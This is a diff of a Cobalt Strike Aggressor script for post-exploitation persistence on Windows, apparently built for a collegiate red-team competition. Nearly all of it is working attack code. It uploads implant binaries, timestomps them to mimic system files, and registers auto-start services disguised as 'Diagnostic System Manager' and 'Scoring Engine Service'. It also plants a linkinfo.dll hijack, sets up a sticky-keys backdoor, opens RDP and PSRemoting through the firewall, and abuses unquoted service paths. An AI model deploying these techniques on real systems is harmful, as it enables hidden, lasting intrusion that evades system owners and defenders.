@@ -2,8 +2,8 @@
 # Created by @jgaudard  :: I don't twitter much
 # Aggressor script for persistence
 # !!! Must create executables for upload. !!!
-# Created: 3 March 2017 Modified: 15 Mar 2017
-# Version 1.0
+# Created: 3 March 2017 Modified: 27 Mar 2017
+# Version 2.0
 #
 # References: 
 # https://blog.cobaltstrike.com/2016/03/16/my-cobalt-strike-scripts-from-neccdc/
@@ -11,25 +11,6 @@
 # https://room362.com/post/2012/2012-05-24-sticky-keys-and-utilman-against-nla/
 # https://www.commonexploits.com/unquoted-service-paths/
 ########################################
-
-
-## variables
-
-$service1name = "adsvc";
-$service1diplay = "Active Directory Service";
-$service1descript = "Provides authentication and policy management for computers joined to domain.";
-$service2name = "";
-$service2display = "";
-$service2descript = "";
-$runkey1 = "/v 'Java Update' /t REG_SZ /d 'C:\program files\java\update.exe'";
-$runkey2 = "";
-$schjob1name = "";
-$schjob1run = "";
-$schjob2name = "";
-$schjob2run = "";
-
-
-
 
 sub stickykeys {
     binput($1, 'Running setup for StickyKeys');
@@ -42,63 +23,122 @@ sub stickykeys {
     bshell($1, 'netsh firewall set service type = remotedesktop mode = enable');
     bshell($1, 'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes');
     bshell($1, 'net start TermService');
-
     binput($1, 'Running setup for PSRemoting');
     bpowershell($1, 'Enable-PSRemoting -Force');
        
 }
-sub persist_adsvc {
-    if (-exists script_resource("adsvc.exe")) {
-        binput($1, "service persistence (server) [AD]");
-        bcd($1, 'c:\windows\system32');
-        bupload($1, script_resource("adsvc.exe"));
-        btimestomp($1, "adsvc.exe", "cmd.exe");
-        bshell($1, 'sc delete adsvc');
-        bshell($1, 'sc create adsvc binPath= "C:\windows\system32\adsvc.exe" start= auto DisplayName= "Active Directory Service"');
-        bshell($1, 'sc description adsvc "Provides authentication and policy management for computers joined to domain."');
-
+sub persist_diagsvc {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("diagsvc.exe")) {
+            blog($1, "Setting up 'Diagnostic System Manager Service Persistence'");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("diagsvc.exe"));
+            btimestomp($1, "diagsvc.exe", "cmd.exe");
+            bshell($1, 'sc delete diagsvc');
+            bshell($1, 'sc create diagsvc binPath= "C:\windows\diagsvc.exe" start= auto DisplayName= "Diagnostic System Manager"');
+            bshell($1, 'sc description diagsvc "The Diagnostic System Manager is used by the Diagnostic System Host service to manage diagnostics and run in a system context. If this service is stopped any diagnostics that depend on it will no longer function."');
+        }
+        else {
+            berror($1, "diagsvc.exe does not exist :(");
+        }
     }
     else {
-        berror($1, "adsvc.exe does not exist :(");
-    }
+        if (-exists script_resource("diagsvc32.exe")) {
+            blog($1, "Setting up 'Diagnostic System Manager Service Persistence'");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("diagsvc32.exe"));
+            btimestomp($1, "diagsvc32.exe", "cmd.exe");
+            bshell($1, 'sc delete diagsvc');
+            bshell($1, 'sc create diagsvc binPath= "C:\windows\diagsvc32.exe" start= auto DisplayName= "Diagnostic System Manager"');
+            bshell($1, 'sc description diagsvc "The Diagnostic System Manager is used by the Diagnostic System Host service to manage diagnostics and run in a system context. If this service is stopped any diagnostics that depend on it will no longer function."');
+        }
+        else {
+            berror($1, "diagsvc32.exe does not exist :(");
+        }
+    }    
 }
 
-sub persist_netsys {
-    if (-exists script_resource("netsys.exe")) {
-        binput($1, "service persistence");
-        bcd($1, 'c:\windows\system32');
-        bupload($1, script_resource("netsys.exe"));
-        btimestomp($1, "netsys.exe", "cmd.exe");
-        bshell($1, 'sc delete netsys');
-        bshell($1, 'sc create netsys binPath= "C:\windows\system32\netsys.exe" start= auto DisplayName= "System Network Monitor"');
-        bshell($1, 'sc description netsys "Monitors the networks to which the computer has connected, collects and stores information about these networks, and notifies registered applications of state changes."');
-        bshell($1, 'sc start netsys');
+sub persist_scorebot {
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("scorebot.exe")) {
+            blog($1, "Setting up Scorebot Service Persistence");
+            bcd($1, 'c:\windows\system32');
+            bupload($1, script_resource("scorebot.exe"));
+            btimestomp($1, "scorebot.exe", "cmd.exe");
+            bshell($1, 'sc delete scorebot');
+            bshell($1, 'sc create scorebot binPath= "C:\windows\scorebot.exe" start= auto DisplayName= "Scoring Engine Service"');
+            bshell($1, 'sc description scorebot "Scoring engine required for white team tracking uptime and services of the host."');
+            bshell($1, 'sc start scorebot');
+        }
+        else {
+            berror($1, "scorebot.exe does not exist :(");
+        }
     }
     else {
-        berror($1, "netsys.exe does not exist :(");
+        if (-exists script_resource("scorebot32.exe")) {
+            blog($1, "Setting up Scorebot Service Persistence");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("scorebot32.exe"));
+            btimestomp($1, "scorebot32.exe", ".\\system32\\cmd.exe");
+            bshell($1, 'sc delete scorebot');
+            bshell($1, 'sc create scorebot binPath= "C:\windows\scorebot32.exe" start= auto DisplayName= "Scoring Engine Service"');
+            bshell($1, 'sc description scorebot "Scoring engine required for white team tracking uptime and services of the host."');
+            bshell($1, 'sc start scorebot');
+        }
+        else {
+            berror($1, "scorebot.exe does not exist :(");
+        }  
     }
 }
 
 sub persist_linkinfo {
-    # dll hijack on explorer.exe
-    if (-exists script_resource("linkinfo.dll")) {
-        binput($1, "dropping linkinfo.dll persistence");
-        bcd($1, 'c:\windows');
-        bupload($1, script_resource("linkinfo.dll"));
-        btimestomp($1, "linkinfo.dll", 'c:\windows\sysnative\linkinfo.dll');
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("linkinfo.dll")) {
+            blog($1, "Setting up linkinfo.dll persistence.");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("linkinfo.dll"));
+            btimestomp($1, "linkinfo.dll", 'c:\\windows\\sysnative\\linkinfo.dll');
+        }
+        else {
+            berror($1, "linkinfo.dll not found.");
+        }
     }
     else {
-        berror($1, "linkinfo.dll not found.");
+        if (-exists script_resource("linkinfo32.dll")) {
+            blog($1, "Setting up linkinfo.dll persistence.");
+            bcd($1, 'c:\windows');
+            bupload($1, script_resource("linkinfo32.dll"));
+            bshell($1, "move c:\windows\linkinfo32.dll c:\windows\linkinfo.dll");
+            btimestomp($1, "linkinfo.dll", 'c:\\windows\\sysnative\\linkinfo.dll');
+        }
+        else {
+            berror($1, "linkinfo32.dll not found.");
+        }
     }
+}    
 sub persist_unquotepath {
-    if (-exists script_resource("program.exe")) {
-    	binput($1, "dropping program.exe");
-	bcd(($1, 'c:\');
-	bupload($1, script_resource("program.exe"));
-	btimestomp($1, "program.exe", "c:\windows\explorer.exe");
+    if (beacon_info($1, 'is64') == 1) {
+        if (-exists script_resource("program.exe")) {
+            blog($1, "Setting up unquoted path persistence with c:\windows\program.exe");
+            bcd(($1, 'c:\');
+            bupload($1, script_resource("program.exe"));
+            btimestomp($1, "program.exe", "c:\\windows\\explorer.exe");
+        }
+        else {
+        berror($1, "program.exe not found");
+        }
     }
     else {
-    	berror($1, "program.exe not found");
+        if (-exists script_resource("program32.exe")) {
+            blog($1, "Setting up unquoted path persistence with c:\windows\program.exe");
+            bcd(($1, 'c:\');
+            bupload($1, script_resource("program32.exe"));
+            bshell($1, "move c:\program32.exe c:\program.exe");
+            btimestomp($1, "program.exe", "c:\\windows\\explorer.exe");
+        }
+        else {
+        berror($1, "program32.exe not found");
+        }
     }
 }
 
@@ -108,44 +148,41 @@ sub persist_schjob {
 
 popup beacon_top {
     menu "Persist" {
-        item "Persist (netsys)" {
+        item "Persist (scorebot)" {
             local('$bid');
             foreach $bid ($1) {
-                persist_netsys($bid);
+                persist_scorebot($bid);
             }
         }
-
         item "Persist (linkinfo)" {
             local('$bid');
             foreach $bid ($1) {
                 persist_linkinfo($bid);
             }
         }
-
-        item "Persist (adsvc)" {
+        item "Persist (diagsvc)" {
             local('$bid');
             foreach $bid ($1) {
-                persist_adsvc($bid);
+                persist_diagsvc($bid);
             }
         }
-
         item "Sticky Keys" {
             local('$bid');
             foreach $bid ($1) {
                 stickykeys($bid);
             }
         }
-        
-	    item "Scheduled Job" {
-	        local('$bid');
-	        foreach $bid ($1) {
-            	persist_schjob($bid);
-	    }   
-	    item "Unquoted Service Path" {
-	        local('$bid');
-	        foreach $bid ($1) {
-            	persist_unquotepath($bid);
-	    }
-    	}
+        item "Scheduled Job" {
+            local('$bid');
+            foreach $bid ($1) {
+                persist_schjob($bid);
+            }
+        }
+        item "Unquoted Service Path" {
+            local('$bid');
+            foreach $bid ($1) {
+                persist_unquotepath($bid);
+            }
+        }
     }
 }
